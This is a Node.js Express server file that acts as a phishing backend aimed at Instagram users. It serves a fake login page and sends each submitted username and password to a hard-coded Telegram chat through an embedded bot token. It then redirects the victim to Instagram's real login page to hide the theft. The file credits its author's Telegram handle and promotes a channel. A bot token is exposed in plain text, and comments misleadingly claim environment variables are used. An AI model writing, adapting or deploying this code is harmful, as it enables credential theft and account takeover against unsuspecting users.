const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config(); // Load environment variables from .env file

const app = express();
const port = 3000;

// Telegram Bot Setup
const telegramBotToken = "7827793191:AAGqv_esVjBvp2A3JA2PRjM5PGXxLIonQf8" // Use the environment variable
const bot = new TelegramBot(telegramBotToken, { polling: true });

// Middleware to parse POST request body
app.use(bodyParser.urlencoded({ extended: false }));

// Serve static files (HTML, CSS, images)
app.use(express.static(path.join(__dirname, 'public')));

// Handle GET request for the login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Handle POST request for login
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // Construct the message with your Telegram username and additional text
    const chatId = "6464385202" // Use the environment variable
    const telegramUsername = '@CDMAXX'; // Replace with your Telegram username
    const message = `Username: ${username}\nPassword: ${password}\nMade by ${telegramUsername}\nJoin my channel @privatearjun`;
    bot.sendMessage(chatId, message);

    // Redirect the user to Instagram's login page
    res.redirect('https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3Fnext%3D%252F%26__coig_login%3D1');
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
